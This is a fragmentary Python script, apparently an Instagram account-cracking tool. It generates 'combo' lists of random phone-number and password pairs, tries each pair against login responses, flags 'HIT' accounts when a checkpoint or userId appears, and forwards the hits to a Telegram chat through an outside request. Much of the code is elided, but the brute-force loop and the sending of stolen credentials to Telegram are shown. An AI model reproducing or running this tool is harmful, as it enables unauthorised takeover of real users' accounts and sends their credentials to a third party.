...
os.system("clear")
os.system("xdg-open https://www.instagram.com/danyar.code/")
os.system("clear")
print("You Need Account Telgram\n")
nia = input("")
id_telgram=int(input("Id Telgram :"))
...
def combo_number():
	...
	for x in range(15000):
		...
		zhyar = random.choice(num)
		#13
		zhyar2 = random.choice(num)
		hamwi = ra+ra2+ra3+ra4+ra5+ra6+ra7
		txt_num.write(t+hamwi+":"+"0212"+hamwi+"\n")
	time.sleep(2)
...
def star():
	...
	tele=0
	point=0
	xos = input("[+] Combo File :")


	ope = open(xos,"r").readlines()
	for dd in ope:
			time.sleep(1)
			ux = dd.strip()
			double = ux.split(":")
			...
			if '"message":"checkpoint_required"' in end:
					...
					print("\033[1;32;40mHIT :{}\033[1;37;40m".format(good))
			...
			if 'userId' in end:
					...
					benera_tele=requests.get(telgram).text
					print(benera_tele)
...
def minu():
	...
	print(logo)
	print("--------------------^°^°^°^°^°^°^°-----------------")
	print("[ 1 ] Combo By Tool ")
	print("[ 2 ] Combo By You")
	try:
		ddg = int(input("\n< Choice :"))
		if ddg==1:
			os.system("clear")
...
#nardne telgram abe testu kamawa